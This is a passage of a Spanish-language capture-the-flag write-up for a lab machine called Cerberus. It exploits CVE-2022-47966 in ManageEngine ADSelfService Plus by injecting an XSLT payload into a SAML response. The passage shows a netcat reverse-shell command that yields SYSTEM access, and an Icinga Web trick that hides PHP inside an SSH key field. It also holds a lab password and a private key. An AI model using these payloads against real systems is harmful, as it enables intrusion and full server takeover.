+![FoxyProxy](/assets/writeups/cerberus/6.png)
+
+Con esta configuración, intentando acceder al puerto 8888 nos llevará a un montón de redirecciones a dominios que vamos a tener que ir agregando a nuestro /etc/hosts para que podamos llegar al aplicativo web. Luego de un ratito por fin logramos ver algo:
+
+![SelfService](/assets/writeups/cerberus/7.png)
+
+Aunque nos pida autenticación, buscando por vulnerabilidades de este software encontramos el CVE-2022-47966, que afecta a muchas versiones de los software de ManageEngine incluido este por uso de una librería desactualizada, entre el rango de versiones afectadas está el que tiene esta máquina... vamos a probar.
+
+Esta vulnerabilidad consiste en una falta de protecciones en el procesamiento de solicitudes SAML, un atacante es capaz de introducir un transform XSLT malicioso para llegar a ejecutar código Java malicioso, esto obviamente solo es abusable si el software tiene la opción de autenticación por SAML activada, y para nuestra suerte si miramos bien en la captura de arriba, podemos ver que hay un parámetro llamado `SAMLRequest` en la petición GET.
+
+Un PoC de GitHub muestra que se agrega lo siguiente a la solicitud
+
+```xml
+<ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">
+  <xsl:stylesheet version="1.0"
+                xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object"
+                xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+                <xsl:template match="/">
+                  <xsl:variable name="rtobject" select="rt:getRuntime()"/>
+                  <xsl:variable name="process" select="rt:exec($rtobject,'{command}')"/>
+                  <xsl:variable name="processString" select="ob:toString($process)"/>
+                  <xsl:value-of select="$processString"/>
+                </xsl:template>
+  </xsl:stylesheet>
+</ds:Transform>
+```
+Vamos a intentar autenticarnos con el servicio de la anterior captura e interceptar dicha autenticación con BurpSuite para alterarla, pero antes debemos darle un ajuste especial: En la parte de `Settings -> Network -> Connections -> SOCKS Proxy` debemos colocar la dirección de nuestro proxy creado con Chisel que normalmente es `127.0.0.1:1080` y activar dicha opción.
+
+Luego de hacerlo ya podemos autenticarnos e interceptar la petición, esto es lo que se envia al autenticarnos por POST:
+
+`UserName=matthew%40cerberus.local&Password=147258369&AuthMethod=FormsAuthentication`
+
+Mientras vamos viendo las respuestas y peticiones que se efectuan después de la autenticación, vemos una interesante:
+
+```bash
+POST /samlLogin/67a8d101690402dc6a6744b8fc8a7ca1acf88b2f HTTP/1.1
+Host: dc:9251
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 5315
+Origin: https://dc.cerberus.local
+Dnt: 1
+Referer: https://dc.cerberus.local/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: cross-site
+Te: trailers
+Connection: close
+
+SAMLResponse=PHNhbWxwOlJlc3BvbnNlIE... [snip]
+```
+
+`SAMLResponse` es un XML codificado en base64 que se ve muy similar a la estructura que se pueden ver en los PoCs
+
+```xml
+<samlp:Response ID="_f95ed4b1-c768-45cc-b9fc-15bb9bdc3de9" Version="2.0" IssueInstant="2023-08-03T21:25:44.731Z" Destination="https://DC:9251/samlLogin/67a8d101690402dc6a6744b8fc8a7ca1acf88b2f" Consent="urn:oasis:names:tc:SAML:2.0:consent:unspecified" InResponseTo="_ffd211a6366007246984649ff61af8a9" xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
+<Issuer xmlns="urn:oasis:names:tc:SAML:2.0:assertion">http://dc.cerberus.local/adfs/services/trust</Issuer>
+<samlp:Status>
+  <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success" /></samlp:Status>
+  <Assertion ID="_f3668364-68cb-49d9-b4a8-f030bffbeb8b" IssueInstant="2023-08-03T21:25:44.684Z" Version="2.0" xmlns="urn:oasis:names:tc:SAML:2.0:assertion">
+  <Issuer>http://dc.cerberus.local/adfs/services/trust</Issuer>
+  <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
+    <ds:SignedInfo>
+    <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#" />
+    <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256" /><ds:Reference URI="#_f3668364-68cb-49d9-b4a8-f030bffbeb8b"><ds:Transforms><ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature" /><ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#" />
+    ... [snip]
+```
+
+Entre todo este XML está el nodo interesante `</ds:Transform>`... vamos a intentar tomar el transform que vimos en el PoC y editarlo con el mismo BurpSuite para colocárselo a esta petición y ver que sucede. 
+
+```xml
+<ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116"><xsl:stylesheet version="1.0" xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:variable name="rtobject" select="rt:getRuntime()"/><xsl:variable name="process" select="rt:exec($rtobject,'ping -n 1 10.10.16.59')"/><xsl:variable name="processString" select="ob:toString($process)"/><xsl:value-of select="$processString"/></xsl:template></xsl:stylesheet></ds:Transform>
+```
+
+Al hacerlo y enviar la petición mientras usamos el tshark para ver el tráfico ICMP, ¡recibimos una traza!
+
+```bash
+❯ doas tshark -i tun0 icmp
+doas (vzon@pwnedz0n) password: 
+Running as user "root" and group "root". This could be dangerous.
+Capturing on 'tun0'
+ ** (tshark:14989) 17:52:19.485195 [Main MESSAGE] -- Capture started.
+ ** (tshark:14989) 17:52:19.485254 [Main MESSAGE] -- File: "/tmp/wireshark_tun0FV7281.pcapng"
+    1 0.000000000 10.10.11.205 → 10.10.16.59  ICMP 60 Echo (ping) request  id=0x0001, seq=782/3587, ttl=127
+    2 0.000013859  10.10.16.59 → 10.10.11.205 ICMP 60 Echo (ping) reply    id=0x0001, seq=782/3587, ttl=64 (request in 1)
+```
+
+Vamos a poner ahora para que nos envíe una consola con un netcat que nosotros vamos a subir a través del WinRM
+
+```xml
+<xsl:variable name="process" select="rt:exec($rtobject,'C:\Temp\nc64.exe -e cmd.exe 10.10.16.59 8443')"/>
+```
+
+```bash
+❯ rlwrap nc -lvnp 8443
+Listening on 0.0.0.0 8443
+Connection received on 10.10.11.205 54532
+Microsoft Windows [Version 10.0.17763.4010]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Program Files (x86)\ManageEngine\ADSelfService Plus\bin>whoami
+whoami
+nt authority\system
+```
+
+y ahora, a tomar la última flag
+
+```bash
+C:\Program Files (x86)\ManageEngine\ADSelfService Plus\bin>cd C:\Users\Administrator
+cd C:\Users\Administrator
+
+C:\Users\Administrator>cd Desktop
+cd Desktop
+
+C:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is D9B1-79BF
+
+ Directory of C:\Users\Administrator\Desktop
+
+03/06/2023  12:50 PM    <DIR>          .
+03/06/2023  12:50 PM    <DIR>          ..
+08/02/2023  10:43 PM                34 root.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   6,290,202,624 bytes free
+
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+665db25824417950d53186a9a5******
+```
+
+## Extra
+
+El estándar de las llaves privadas SSH define que cualquier otra cosa que no sea la llave será tomada como simples metadatos de esta, por lo que introducir algo como esto en el campo de las llaves SSH del Icinga Web
+
+```php
+<?php 
+  phpinfo();
+  /*
+-----BEGIN PRIVATE KEY-----
+MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQChdUkYvmNIdceg
+nB8K0s37C/L0ZQsbseA+iOyOQfVbcm7bN3Aj0kUoIZyOJrInhHdoMqbVY5o3wjyA
+B7jZk2t0dkX/vy3sVcHaH4x9a32mIndAiSIaerL/WgSGVRmrU1x80ytuKm0uLWyU
+fq9NZed2L/L2Ptodpv8kSAkb5l80vxErBg4pOucAhOzEBX78XvopM00iGw/C4SYx
+XPLX5mwBOS+wM/yav9ZKkJHoRExi8yzpHBXeoMM3hTUEeKTuC6wlJpUwtg2Z7XkD
+EsZVvYLpYO9yKGyvtpYe1/+Ndy1SYKXIGSMQmjODDb4PL9JdFrqnoccGY1aMAyK8
+ZjoUM2RzAgMBAAECggEABpBA2UooDr0xpnmiQ2uKvGlhxjCeBnwGfH75dYEAleft
+fL42B1FtcUezLbjXUNxFibgBaIxPgR5wHNjzg+4bwKoW3LeAs5T64pXvZ/Z+LvTu
+Dx1kBFqM5ezatpFFZV29VUUKWhn3F+5Nyy2T4nFsOuA7yr8xrmHoXlO1VxaC3p8o
+mCh4YiJ4/hwFyTY4HJLKQw0yZcscLjE+9zAIkVQsJukwgjGe1xOu8WqZWWmYwL/H
+TnIDF2aUXrBlNQ1RIZUgClAG0djRg0IjlagaFXabMhpuyEct67bs69uKau7xrkFb
+3wkEjlm9SaMQn/fKXr5iz9Upc5Yl5t/xQqNT0THhNQKBgQDPp48DqAr8UQaayKAS
+6h5lblXGWrom8EmvvsF5/pS5+XaX7xbyZgJa6n8SbIwayDYa5K98znEgPMpkrgGe
+xYfuFXsaH07ZHt+OOSXfpgcBEUsnLPft4qz2G7kuOdbmFXhuUVsyKCGxfrT96rbv
+fQc9OrXNgaQ3oR/H5n3wJJt3xwKBgQDHDF8DuF9rymnIdF+DeSBLZXosmWYRnacw
+tWwLB/rU83fj9wojjgmhpD1/awl8cQAamIhQ/O+Ev9EqK8hYweG9H09htlxL1tZ8
+/lMaEoHd2KId6hFTtve5JQMFbQ4hW/jwsAnPuLvOQqSrKN5TK1KONEd5ImOIMrLI
+yXSNeBYl9QKBgGEwChZrAuE+xvmQpqLTonBUqJ6SfgeVdNdlT0ZaqZ81K5VGmJXQ
+uo90qw6jcRtj0zbZC209beLpsMxYSHfX+ZurwBbkylGCSp1VD+3R1ftg7ayjNlLH
+Qa5aIVyKQ5MiP2BagXVDJSnepLUmsoH6IXY90TMi1woWRjqYHR9U8tKnAoGAdkfD
+rlJBYaxGb/e3SkkQB72lfBsrrAwi7a7hJSz4wNJsy+pg+//LeWI/qRfR60C67xL0
+7itfqWLSyFx8EUIlAl04rrfO4MIpct0uRK/6u/mfXGdbJIP1cO+te+vyGaCtrVju
+e6Eq+MZhU9RVSNbVl+s5DaKBws1dsDMGL4rMnoECgYAitVrs3/KELS8FuGRP6m6G
+zZAZkBg5TwnL+rxKbUErHPIv5CXyl0wHF4m7LiDgLDeJ1wE/2P0cpcOH8cDgR48d
+yOJUy6Qxyc7Nnj1X13VLym3V3dJISKdVblFuQHnjn1r0hAyamy8Uid47nJ+f3ETi
+o4FzNzpe/KNvKuBD8lnTXA==
+-----END PRIVATE KEY-----
+  */
+?>
+```
+
+es completamente válido.
+
+```bash
+❯ curl -v http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/ssh/justatest
+*   Trying 10.10.11.205:8080...
+* Connected to icinga.cerberus.local (10.10.11.205) port 8080 (#0)
+> GET /icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/ssh/justatest HTTP/1.1
+> Host: icinga.cerberus.local:8080
+> User-Agent: curl/8.1.2
+> Accept: */*
+> 
+< HTTP/1.1 200 OK
+< Date: Thu, 03 Aug 2023 22:32:52 GMT
+< Server: Apache/2.4.52 (Ubuntu)
+< Cache-Control: public, max-age=1814400, stale-while-revalidate=604800
+< Etag: 40356-6e8-6020c5984c340
+< Last-Modified: Thu, 03 Aug 2023 22:32:05 GMT
+< Transfer-Encoding: chunked
+< Content-Type: text/x-php;charset=UTF-8
+< 
+<?php 
+  phpinfo();
+  /*
+-----BEGIN PRIVATE KEY-----
+MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQChdUkYvmNIdceg
+... [snip]
+```
